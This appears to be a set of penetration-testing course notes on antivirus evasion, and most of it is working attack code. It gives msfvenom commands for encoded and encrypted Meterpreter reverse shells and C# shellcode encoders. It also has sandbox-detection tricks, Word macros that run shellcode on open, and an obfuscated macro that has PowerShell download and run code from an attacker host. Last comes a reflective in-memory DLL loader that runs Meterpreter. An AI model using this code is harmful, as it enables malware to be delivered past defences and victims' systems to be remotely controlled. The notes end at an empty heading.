# AV Evasion

### Basic Evasion

We can set "EnableStageEncoding" to true and StageEncoder to "x64/zutto\_dekiru" on a Meterpreter payload, this way the 2nd stage will be encrypted and encoded.

**Metasploit Encoders**

```bash
msfvenom  --list encoders
sudo msfvenom -p windows/meterpreter/reverse_https LHOST=eth0 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe

sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -e x64/zutto_dekiru -f exe -o met64_zutto.exe

# C:\Windows\System32\notepad.exe
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
```

**Metasploit Encryptors**

```bash
msfvenom --list encrypt

# generate an executable with aes256-encrypted shellcode and use a custom encryption key through the --encrypt-key option
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe
```

**Bypassing AV with C#**

antiscan.me

Console App (.NET Framework) **Helper app that can encrypt our shellcode using Caesar cipher**

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Helper
{
    internal class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[636] { 0xfc, 0x48, 0x83, ..., 0x56, 0xff, 0xd5 };

	    // Encryption routine with Caesar cipher with a substitution key of 2 which, while iterating through each byte value in the shellcode, adds 2 to its value.
	    // We performed a bitwise AND operation with 0xFF to keep the modified value within the 0-255 range (single byte) in case the increased byte value exceeds 0xFF.
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }
	    // Prints the encrypted shellcode to the console
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}

```

**Decryptor**

```csharp
// decrypts the encrypted shellcode by using the substitution key of 2 and subtracts
for (int i = 0; i < buf.Length; i++)
{
	buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
}
```

### Bypassing Heuristic (Behavioral) Detection

**Sleep Timers**

One of the oldest behavior analysis bypass techniques revolves around time delays. If an application is running in a simulator and the heuristics engine encounters a pause or sleep instruction, it will "fast forward" through the delay to the point that the application resumes its actions. This avoids a potentially long wait time during a heuristics scan.

One simple way to take advantage of this is with the Win32 _Sleep_[1](https://portal.offsec.com/courses/pen-300/books-and-videos/modal/modules/introduction-to-antivirus-evasion/messing-with-our-behavior/simple-sleep-timers#fn1) API, which suspends the execution of the calling thread for the amount of time specified. If this section of code is being simulated, the emulator will detect the _Sleep_ call and fast-forward through the instruction.

If our program observes the time of day before and after the _Sleep_ call, we can easily determine if the call was fast-forwarded. For example, we can inject a two-second delay, and if the time checks indicate that two seconds have not passed during the instruction, we assume we are running in a simulator and can simply exit before any suspect code is run.

```csharp
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);
        
static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
    if(t2 < 1.5)
    {
        return;
    }
```

**Non-emulated APIs**

Antivirus emulator engines only simulate the execution of most common executable file formats and functions. Knowing this, we can attempt to bypass detection with a function (typically a Win32 API) that is either incorrectly emulated or is not emulated at all.

In general, there are two ways of locating non-emulated APIs. The first is to reverse engineer the antivirus emulator, but due to the highly complex software, this will be very time consuming. A second, and perhaps simpler, way is to test out various APIs against the AV engine. The general concept is that when the AV emulator encounters a non-emulated API, its execution will fail. In these cases, our malicious program will have a chance to detect AV emulation by simply testing the API result and comparing it with the expected result.

For example, consider the Win32 _VirtualAllocExNuma_[1](https://portal.offsec.com/courses/pen-300/books-and-videos/modal/modules/introduction-to-antivirus-evasion/messing-with-our-behavior/non-emulated-apis#fn1) API. The "Numa" suffix (which refers to a system design to optimize memory usage on multi-processor servers[2](https://portal.offsec.com/courses/pen-300/books-and-videos/modal/modules/introduction-to-antivirus-evasion/messing-with-our-behavior/non-emulated-apis#fn2)) makes this a relatively uncommon API.

In essence, this API allocates memory just like _VirtualAllocEx_ but it is optimized to be used with a specific CPU. Obviously, this type of optimization is not required on a standard single-CPU workstation.

> There is no "master list" for obscure APIs, but browsing APIs on MSDN and reading about their intended purposes may provide clues as to how common they may be.

Because of this, some antivirus vendors do not emulate _VirtualAllocExNuma_ and, in this case, its execution by the AV emulator will not result in a successful memory allocation.

```csharp

[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();

static void Main(string[] args)
{
	IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
		if (mem == null)
		{
			return;
		}
....
}
```

### Bypassing AV in VBA

**Helper**

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Helper
{
    internal class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[636] { 0xfc, 0x48, 0x83, ..., 0x56, 0xff, 0xd5 };

		// Encryption routine with Caesar cipher with a substitution key of 2 which, while iterating through each byte value in the shellcode, adds 2 to its value.
		// We performed a bitwise AND operation with 0xFF to keep the modified value within the 0-255 range (single byte) in case the increased byte value exceeds 0xFF.
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }
			
			uint counter = 0;
			// Prints the encrypted shellcode to the console
			StringBuilder hex = new StringBuilder(encoded.Length * 2);
			foreach(byte b in encoded)
			{
				hex.AppendFormat("{0:D}, ", b);
			    counter++;
			    if(counter % 50 == 0)
			    {
			        hex.AppendFormat("_{0}", Environment.NewLine);
			    }
		  }
		  Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
	Dim t1 As Date
	Dim t2 As Date
	Dim time As Long
	
	t1 = Now()
	Sleep (2000)
	t2 = Now()
	time = DateDiff("s", t1, t2)
	
	If time < 2 Then
	    Exit Function
	End If
    
    ' msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication
    buf = Array(232, 130, 0, 0, ...,123)

	
	For i = 0 To UBound(buf)
	    buf(i) = buf(i) - 2
	Next 

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

End Function
```

**Hiding PowerShell Inside VBA**

Our goal is to use WMI from VBA to create a PowerShell process instead of having it as a child process of Microsoft Word. When performing an action, the Winmgmt WMI service is created in a separate process as a child process of _Wmiprvse.exe_,[4](https://portal.offsec.com/courses/pen-300/books-and-videos/modal/modules/introduction-to-antivirus-evasion/hiding-powershell-inside-vba/dechaining-with-wmi#fn4) which means we can de-chain the PowerShell process from Microsoft Word.

```vb
Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

**Obfuscating VBA**

* Decryption routine functions (pears, strawberries, almonds and nuts)
* The main _Nuts_ function performs a _while_ loop through the entire encrypted string where the _Oatmilk_ variable is used to accumulate the decrypted string.
* For each iteration of the loop, the entire encrypted string is sent to _Strawberries_. The function uses _Left_ to fetch the first three characters of the string and returns that value.
* Next, the _Pears_ function is called with the three-character string as input. It treats the three character string as a number, subtracts the Caesar cipher value of 17, and then converts it to a character that is added to the accumulator in _Oatmilk_.
* Once a character is returned, the _Almonds_ function is called inside the loop where the _Right_ function will exclude the first three characters that we just decrypted.
* There are a number of ways to bypass heuristics in VBA that do not involve the use of Win32 APIs.[10](https://portal.offsec.com/courses/pen-300/books-and-videos/modal/modules/introduction-to-antivirus-evasion/hiding-powershell-inside-vba/obfuscating-vba#fn10) One simple technique is to check the document name when the macro runs.
* When most antivirus products emulate the execution of a document, they rename it. During execution, we check the name of the document and if we find that it is not the same as the one we originally provided, we can assume the execution has been emulated and we can exit the code.
* For example, let's assume we named the document runner.doc. If we check the _Name_[11](https://portal.offsec.com/courses/pen-300/books-and-videos/modal/modules/introduction-to-antivirus-evasion/hiding-powershell-inside-vba/obfuscating-vba#fn11) property of the _ActiveDocument_ and find it to be anything but runner.doc, we'll exit to avoid heuristics detection. To further the obfuscation, we'll even encrypt this static document name (runner.doc in our case).

```vb
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    
    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
	  Exit Function
	End If
	
    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"
    Water = Nuts(Apples)

'GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid'
GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function
```

Encryption script

```powershell
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

[string]$output = ""
# converts payload into char array and runs output through a Foreach loop (%).
# Inside the loop, the byte value of each character is increased by 17, which is the Caesar cipher key selected in this example. We'll use if and else conditions to pad the character's decimal representation to three digits.
# Finally, each decimal value is appended to the output string and piped onto the clipboard through clip
$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
```

#### Run.txt

In-memory powershell

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.204/ClassLibrary1.dll')

# the Load method accepts a byte array in memory instead of a disk file
$assem = [System.Reflection.Assembly]::Load($data)

$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

ClassLibrary1.dll

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f csharp
            byte[] buf = new byte[662] {0xfc,0xe8,0x8f...};

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### Advanced Evasion

